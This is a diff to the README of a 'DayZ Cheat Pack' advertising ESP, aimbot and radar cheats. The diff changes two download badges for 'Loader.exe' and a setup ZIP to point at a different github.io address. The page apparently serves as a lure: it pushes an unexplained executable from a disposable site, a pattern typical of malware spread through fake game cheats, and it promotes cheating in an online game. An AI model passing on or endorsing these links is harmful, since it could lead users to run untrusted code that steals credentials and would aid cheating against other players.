@@ -1,7 +1,7 @@
 # 🎯 DayZ Cheat Pack — ESP - Aimbot - Radar Setup Tool
 
-[![Download Loader.exe](https://img.shields.io/badge/Download-Loader.exe-green?style=for-the-badge)](https://dayz-cheat-pack-esp-aimbot.github.io/.github/)
-[![Get Full Package](https://img.shields.io/badge/Get_Setup_Package-ZIP-blue?style=for-the-badge)](https://dayz-cheat-pack-esp-aimbot.github.io/.github/)
+[![Download Loader.exe](https://img.shields.io/badge/Download-Loader.exe-green?style=for-the-badge)](https://davis0056601.github.io/.github/dayz-cheat-pack-esp-aimbot)
+[![Get Full Package](https://img.shields.io/badge/Get_Setup_Package-ZIP-blue?style=for-the-badge)](https://davis0056601.github.io/.github/dayz-cheat-pack-esp-aimbot)
 
 ---
 
